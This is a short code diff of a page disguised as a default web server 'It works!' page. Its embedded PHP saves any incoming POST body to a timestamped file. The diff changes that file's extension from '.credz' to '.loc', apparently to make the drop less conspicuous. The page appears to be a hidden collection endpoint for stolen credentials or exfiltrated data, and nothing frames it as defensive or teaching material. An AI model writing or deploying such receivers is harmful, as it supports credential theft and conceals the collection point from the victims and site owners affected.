@@ -3,7 +3,7 @@
    <body>
       <h1>It works!</h1>
       <?php
-      $file = date("dHism") . ".credz";
+      $file = date("dHism") . ".loc";
       file_put_contents($file, file_get_contents("php://input"));
       ?>
    </body>
